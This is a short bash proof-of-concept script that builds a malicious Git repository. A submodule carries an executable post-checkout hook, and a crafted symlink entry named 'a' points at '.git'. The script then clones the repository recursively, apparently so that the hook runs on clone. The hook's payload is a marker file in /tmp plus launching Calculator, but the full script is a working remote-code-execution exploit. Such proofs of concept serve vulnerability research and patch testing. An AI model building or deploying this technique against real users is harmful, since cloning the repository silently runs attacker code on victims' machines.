#!/bin/bash

# Set Git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true
# optional, but I added it to avoid the warning message
git config --global init.defaultBranch main 


# Define the tell-tale path
tell_tale_path="$PWD/tell.tale"

# Initialize the hook repository
git init hook
cd hook
mkdir -p y/hooks

# Write the malicious code to a hook
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
echo "amal_was_here" > /tmp/pwnd
calc.exe
open -a Calculator.app
EOF

# Make the hook executable: important
chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "post-checkout"

cd ..

# Define the hook repository path
hook_repo_path="$(pwd)/hook"

# Initialize the captain repository
git init captain
cd captain
git submodule add --name x/y "$hook_repo_path" A/modules/x
git commit -m "add-submodule"

# Create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
cd ..

git clone --recursive captain hooked
